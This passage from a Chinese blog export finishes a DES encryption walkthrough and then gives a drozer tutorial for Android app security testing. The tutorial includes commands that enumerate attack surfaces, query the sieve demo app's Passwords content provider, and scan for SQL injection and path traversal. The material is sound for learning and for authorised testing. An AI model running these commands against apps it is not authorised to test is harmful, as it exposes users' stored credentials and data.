<li>逆置换<br>将初始置换进行16次的迭代，即进行16层的加密变换，得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。逆置换是初始置换的逆运算。从初始置换规则中可以看到，原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。以此类推，逆置换规则表如下<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40,08,48,16,56,24,64,32,</span><br><span class="line">39,07,47,15,55,23,63,31,</span><br><span class="line">38,06,46,14,54,22,62,30,</span><br><span class="line">37,05,45,13,53,21,61,29,</span><br><span class="line">36,04,44,12,52,20,60,28,</span><br><span class="line">35,03,43,11,51,19,59,27,</span><br><span class="line">34,02,42,10,50,18,58 26,</span><br><span class="line">33,01,41,09,49,17,57,25,</span><br></pre></td></tr></table></figure>
逆置换过程图：</li>
</ul>
<p><img src="/images/pasted-13.png" alt="upload successful"></p>
<p>将L16与R16构成64位数据，经过逆置换表输出密文为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密文：0101100000001000001100000000101111001101110101100001100001101000</span><br></pre></td></tr></table></figure>
<hr>
<p>DES 加密算法为最为常见的分组加密算法。其主要思想在于数据位的置换与移位过程，通过16次的迭代加密与最终的逆置换得出最终的密文。DES 的解密方式只需按照加密的逆过程求解即可。由于DES 加密过程的算法是公开的，所以密钥K的保密就显得尤为重要，只有发送方与接收方采用相同的密钥进行加密解密才能获取明文数据。</p>
<hr>
]]></content>
  </entry>
  <entry>
    <title>drozer安装和使用</title>
    <url>/2021/05/20/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="一、什么是drozer？"><a href="#一、什么是drozer？" class="headerlink" title="一、什么是drozer？"></a>一、什么是drozer？</h3><ul>
<li>Drozer是MWR Labs开发的一款Android安全测试框架。是目前最好的Android安全测试工具之一。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”在Web世界已经有了许多安全测试工具了,我们只需要给出一个目标,这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同,Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试,用户在自己的工作站上输入命令,Drozer会将命令发送到Android设备上的代理程序执行。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。</li>
</ul>
<h3 id="二、drozer安装"><a href="#二、drozer安装" class="headerlink" title="二、drozer安装"></a>二、drozer安装</h3><ol>
<li>下载drozer，解压把Drozer工具包drozer-installer-2.3.4.zip解压后看到的目录如下图，其中setup.exe文件是安装在PC机上面的，agent.apk是安装在手机模拟器或者移动手机里面的。</li>
</ol>
<p><img src="/images/pasted-14.png" alt="upload successful"></p>
<ol start="2">
<li>使用adb工具把“agent.apk”安装到模拟器中去。首先确保adb与模拟器或者是实体机已经连接好了，然后使用“adb install agent.apk”命令进行安装。或者是直接将APK放到实体机中安装。应用列表中出现如下图标证明已经安装好了。</li>
</ol>
<p><img src="/images/pasted-15.png" alt="upload successful"></p>
<h3 id="三、drozer启动"><a href="#三、drozer启动" class="headerlink" title="三、drozer启动"></a>三、drozer启动</h3><ol>
<li>在android端设置启用“drozer agent”，运行drozer，然后点击embedded server。</li>
</ol>
<p><img src="/images/pasted-16.png" alt="upload successful"></p>
<ol start="2">
<li>点击enable启动drozer server。</li>
</ol>
<p><img src="/images/pasted-17.png" alt="upload successful"></p>
<ol start="3">
<li>在PC机drozer目录下输入以下命令，<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\drozer&gt;adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>
 这里drozer Server默然监听的为31415端口，所以需要在主机上同样与31415端口进行通信，本地电脑上调用adb执行命令：adb forward tcp:31415 tcp:31415 进行端口转发;<br> 然后运行drozer console connect，出现以下 “dz&gt;”提示符，说明通信成功.</li>
</ol>
<p><img src="/images/pasted-18.png" alt="upload successful"></p>
<h3 id="四、drozer使用"><a href="#四、drozer使用" class="headerlink" title="四、drozer使用"></a>四、drozer使用</h3><ol>
<li>查找终端设备所有APK信息.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run app.package.list</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-19.png" alt="upload successful"></p>
<ol start="2">
<li>通过关键字过滤来匹配显示目标数据包<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run app.package.list -f settings</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>含义：-f是过滤的意思，通过后面的关键字过滤来匹配显示。</li>
</ul>
<p><img src="/images/pasted-20.png" alt="upload successful"></p>
<ol start="3">
<li>查看指定apk的信息，例如查看百度地图app的信息.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-21.png" alt="upload successful"></p>
<ol start="4">
<li>查找APK存在的攻击面.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run app.package.attacksurface com.baidu.BaiduMap</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>含义：查找APK存在的攻击面(activity、content、provider、service)</li>
</ul>
<p><img src="/images/pasted-22.png" alt="upload successful"></p>
<ol start="5">
<li>获取activity信息<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-23.png" alt="upload successful"></p>
<ol start="6">
<li>启动activity<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>使用方法：run app.activity.start –component 包名 activity组件名<br>help app.activity.start命令时查看app.activity.start命令的使用方法</li>
</ul>
<p><img src="/images/pasted-24.png" alt="upload successful"><br>执行命令之后在模拟器或者是实体机上会启动对应的activity.</p>
<ol start="7">
<li>获取Content Provider信息<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<ol start="8">
<li>获取所有可以访问的Uri——Content Providers（数据泄露）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-28.png" alt="upload successful"></p>
<ol start="9">
<li>获取各个Uri的数据—Content Providers（数据泄露）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-29.png" alt="upload successful"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords –vertical</span><br></pre></td></tr></table></figure>
<p>加上 “–vertical”只显示结果</p>
<p><img src="/images/pasted-30.png" alt="upload successful"></p>
<ol start="10">
<li>检测SQL注入<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-31.png" alt="upload successful"></p>
<ol start="11">
<li>检测目录遍历<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/pasted-32.png" alt="upload successful"></p>
<ul>
<li>[参考来源]（<a href="https://blog.51cto.com/laoyinga/2052997%EF%BC%89">https://blog.51cto.com/laoyinga/2052997）</a></li>
</ul>
]]></content>
  </entry>
</search>
